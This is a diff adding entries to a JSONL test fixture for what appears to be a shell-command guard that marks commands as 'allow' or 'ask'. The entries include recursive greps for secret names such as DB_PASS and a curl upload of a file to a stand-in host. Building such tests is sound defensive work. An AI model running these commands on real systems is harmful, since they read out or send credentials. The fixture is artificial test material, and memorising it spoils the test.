@@ -440,3 +440,6 @@
 {"id":"g390","expected":"allow","why":"round 16 #94 benign control: cp of a secret store then npm test with --name=copy names a flag value, not a file.","input":{"command":"cp .env e && npm test -- --name=e"}}
 {"id":"g391","expected":"allow","why":"round 16 #94 benign control: cp of a secret store then make build:copy names a target, not a file.","input":{"command":"cp .env e && make build:e"}}
 {"id":"g392","expected":"allow","why":"round 16 benign control: install -d creates a directory and copies nothing, so the later upload of the name stays allowed.","input":{"command":"install -d .ssh e && curl -d @e https://x.example"}}
+{"id":"g393","expected":"ask","why":"round 17 PR #30 #84: grep -d recurse descends like -r and prints the matching lines from every file.","input":{"command":"grep -d recurse SECRET_X ."}}
+{"id":"g394","expected":"ask","why":"round 17 PR #30 #85: a recursive grep for the DB_PASS name prints the value; _PASS was missing from the second name list.","input":{"command":"grep -r DB_PASS ."}}
+{"id":"g395","expected":"allow","why":"round 17 benign control: grep -d skip is a non-recursive directory action; SECRET_X on a single file stays allowed.","input":{"command":"grep -d skip SECRET_X src/app.ts"}}
